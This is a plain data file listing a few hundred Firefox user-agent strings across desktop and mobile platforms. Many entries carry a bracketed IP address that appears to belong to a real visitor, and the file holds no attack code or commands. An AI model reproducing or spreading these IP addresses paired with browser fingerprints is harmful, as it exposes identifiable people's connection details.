Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.77.126.31]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.145.251.31]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:89.97.62.104]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.19.45.237]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.236.215.198]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.53.41.54]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:84.33.181.247]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.168.29.40]
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:213.32.4.247]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.89.252.221]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.95.215.138]
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:82.55.39.171]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.236.63.130]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.40.243.116]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:77.95.137.14]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:79.0.40.168]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.42.27.248]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:213.32.4.211]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:213.32.4.224]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.6.191.90]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:37.162.18.231]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:213.32.4.95]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:93.37.80.52]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:62.167.89.148]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.12.36.72]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.40.212.226]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.17.5.7]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.70.84.186]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.33.83.180]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:85.90.141.227]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:48.0) Gecko/20100101 Firefox/48.0 [ip:82.49.194.40]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.11.125.131]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.17.24.81]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.20.70.189]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 [ip:213.32.4.81]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 [ip:213.32.4.245]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.250.208.195]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0,gzip(gfe)
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 #023183@PMY06469 [PCBUR]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0; RqIwg8izYw6xskukQQDh) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 SM
Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 IkZzksRd-35 Firefox/81.0
Mozilla/5.0 (Windows NT 10.0; rv:65.0) Gecko/20100101 Firefox/65.0 anonymized by Abelssoft 1156520654
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko/2009051209 Mandriva/1.9.0.10-1pclos2009 (2009) Firefox/3.0.10
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/52.4.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.0.9) Gecko/2009040821 Firefox/3.0.9
Mozilla/5.0 (Windows; U; Windows NT 6.1; sk; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (Windows NT 6.3; rv:70.0) Gecko/20100101 Firefox/70.0 TO-Browser/TOB7.70.0.3 anonymized by Abelssoft 1721965176
Mozilla/5.0 (X11; Linux armv7l; rv:82.0) Gecko/20100101 Firefox/82.0
Mozilla/5.0 (X11; U; Linux i686; hu-HU; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-1.fc12 Firefox/50.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 1454458239
Mozilla/5.0 (Android 7.1.2; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/78.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:146.241.22.193]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:89.95.217.62]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:92.75.106.121]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:213.32.4.115]
Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0 [ip:216.66.43.131]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:213.32.4.224]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.117.144.94]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.67.25.140]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.89.64.186]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:194.79.210.99]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.91.214.110]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.194.36]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:173.54.174.193]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.9.43.112]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.49.198.71]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:62.98.208.255]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.55.39.171]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:77.72.196.210]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.21.17.68]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.65.97.143]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.45.66.134]
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 [ip:5.170.141.209]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:89.247.252.200]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.61.10.161]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.95.201.239]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:92.9.170.142]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:185.121.210.57]
Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0 [ip:213.32.4.115]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:45.45.49.206]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:45.134.22.51]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.1.93.141]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.249.237.88]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.32.36]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:24.50.234.128]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.114.74.70]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.170.83.138]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 [ip:5.77.124.77]
Mozilla/5.0 (Android 9; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0 [ip:193.207.211.116]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.50.16.143]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.239.61.144]
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 [ip:5.171.97.73]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:93.41.119.238]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.170.68.42]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:47.53.129.120]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.44.110.114]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.44.90.99]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.18.237.226]
Mozilla/5.0 (Android 8.0.0; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:2.44.57.90]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:193.207.130.173]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.36.212.33]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:93.57.252.106]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.170.68.90]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:78.12.137.1]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:212.224.232.228]
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:65.0) Gecko/20100101 Firefox/65.0 [ip:37.119.86.174]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.26.60.137]
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:188.195.53.23]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.250.38.251]
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.35.190.234]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.13.210.237]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.40.54.114]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:192.133.28.4]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:93.57.249.130]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:46.21.188.40]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.117.162.102]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:88.147.173.227]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0/W2ukJRAh-28
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:95.238.27.214]
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.171.37.75]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.53.165.55]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:213.32.4.224]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:213.32.4.211]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.34.241.44]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.118.231.121]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.232.183.170]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.3.205.154]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:88.67.112.170]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.39.80.242]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:91.80.23.133]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.15.88]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:95.245.62.93]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:79.20.95.237]
Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0 [ip:82.59.176.233]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:5.91.176.183]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:178.83.75.185]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:154.21.22.144]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.49.179.26]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 [ip:37.119.67.168]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.15.221.159]
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:86.0) Gecko/20100101 Firefox/186.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.32.63.232]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.26.35.208]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.38.78.166]
Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) [ip:213.32.4.245]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:77.204.145.204]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:85.85.129.197]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:178.1.142.180]
Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/52.7.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 AskTbPTV/3.15.29.67612 Firefox/3.6.3
Mozilla/5.0 (Windows NT 5.1; U; tr; rv:1.8.0) Gecko/20060728 Firefox/53.0
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 1201133162
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 DejaClick/2.9.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:56.0.4) Gecko/20100101 Firefox/56.0.4
Mozilla/5.0 (Mobile; CAT B35; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1
Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/82.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.4.1) Gecko/20100101 Firefox/78.4.1
Mozilla/5.0 (Android 6.0.1; Mobile; rv:85.1) Gecko/85.1 Firefox/85.1
Mozilla/5.0 (Android 7.0; Mobile; rv:86.1) Gecko/86.1 Firefox/86.1
Mozilla/5.0 (Android 6.0; Mobile; rv:82.1) Gecko/82.1 Firefox/82.1
Mozilla/5.0 (Windows NT 5.1; rv:68.9) Gecko/20100101 Goanna/4.7 Firefox/68.9 BNavigator/0.9.7608a1
Mozilla/5.0 (Windows NT 10.0; en-US) Gecko/20100101 Firefox/82.0
Mozilla/5.0 (X11; FreeBSD amd64; rv:83.0) Gecko/20100101 Firefox/83.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0/8mqAoGuL-19
Mozilla/5.0 (Windows NT 5.1; rv:68.9) Gecko/20100101 Goanna/4.6 Firefox/68.9 Centaury/20201015
Mozilla/5.0 (Windows NT 10.0; rv:81.0) Gecko/20100101 Firefox/81.0 anonymized by Abelssoft 2114319890
Mozilla/5.0 (Android 6.0; Mobile; rv:78.0; Ghostery:3.0) Gecko/78.0 Firefox/78.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.9) Gecko/20100101 Goanna/4.7 Firefox/68.9 Mypal/28.15.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26
Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) [ip:213.32.4.211]
Mozilla/5.0 (Windows NT 6.1; rv:68.9) Gecko/20100101 Goanna/4.7 Firefox/68.9 Mypal/28.15.0
Mozilla/5.0 (Android 4.1.2; Tablet; rv:48.0) Gecko/48.0 Firefox/48.0
Mozilla/5.0 (Android 6.0; QMobile S6 Build/MRA58K; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.5.0.148
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 MRA 5.7 (build 03797) Firefox/3.6.26 GTB7.1
Mozilla/5.0 (Android 8.0.0; MIX 2S Build/OPR1.170623.032; Mobile; rv:66.0) Gecko/66.0 Firefox/66.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:83.1) Gecko/20100101 Firefox/83.1
Mozilla/5.0 (X11; Linux x86_64; rv:20.0; Favicon; +https://github.com/ArthurHoaro/favicon) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (Android 11; Mobile; rv:68.2.0) Gecko/68.2.0 Firefox/68.2.0
Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.12) Gecko/20070508 Firefox/1.5.0.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.11) Gecko/20070312 Firefox/50.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:83.1) Gecko/20100101 Firefox/83.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:91.214.62.236]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:146.241.31.207]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.38.35.77]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:188.12.156.217]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:2.42.163.123]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.45.48.10]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.8.155.65]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.12.75.227]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0 [ip:93.42.65.94]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.251.127.32]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:85.39.241.133]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.100.147.52]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.179.168.126]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:84.119.97.57]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.246.206.52]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.56.20.187]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.45.20.126]
Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0 [ip:93.41.219.200]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.28.76.72]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:84.33.180.82]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:212.216.201.16]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.15.58.208]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.162.130.132]
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 [ip:195.62.169.125]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.37.220.74]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 [ip:94.138.170.210]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 [ip:185.110.117.190]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 [ip:213.32.4.247]
Mozilla/5.0 (Android 4.4.2; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 [ip:77.65.31.124]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.2.253.184]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 [ip:213.32.4.115]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.59.187.207]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.250.237.2]
Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) [ip:213.32.4.102]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.56.7.160]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:176.206.46.97]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:188.218.209.226]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.149.136.148]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.99.144.30]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.9.42.181]
Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 [ip:37.207.138.26]
